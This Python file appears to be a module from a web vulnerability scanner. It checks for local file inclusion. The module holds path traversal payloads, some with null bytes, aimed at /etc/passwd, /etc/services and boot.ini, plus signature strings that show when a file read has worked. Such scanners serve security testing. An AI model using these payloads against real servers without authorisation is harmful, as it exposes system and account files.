from cores.base_module import Scanner


class Check(Scanner):
	def gen_payload(self):
		return [
			"/etc/passwd",
			"/etc/passwd\0",
			"c:\\boot.ini",
			"c:\\boot.ini\0",
			"../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../etc/passwd\0",
			"../../../../../../../../../../../../../../../../../../../../etc/services\0",
			"../../../../../../../../../../boot.ini",
			"../../../../../../../../../../../../../../../../../../../../boot.ini",
			"../../../../../../../../../../boot.ini\0",
			# "indexXX",
		]

	def signature(self):
		# Signature by github.com/dmknght
		return {
			"Nix LFI": [
				"root:x:0:0",
				"root:*:0:0",
				"www-data:x:",
			],
			"Windows LFI": [
				"[boot loader]",
			],
			"File Includsion": [
				"java.io.FileNotFoundException:",
				"fread(): supplied argument is not",
				"fpassthru(): supplied argument is not",
				"for inclusion (include_path=",
				"Failed opening required",
				"Warning: file(", "file()",
				"<b>Warning</b>:  file(",
				"Warning: readfile(",
				"<b>Warning:</b>  readfile(",
				"Warning: file_get_contents(",
				"<b>Warning</b>:  file_get_contents(",
				"Warning: show_source(",
				"<b>Warning:</b>  show_source(",
				"Warning: highlight_file(",
				"<b>Warning:</b>  highlight_file(",
				"System.IO.FileNotFoundException:",
			]
		}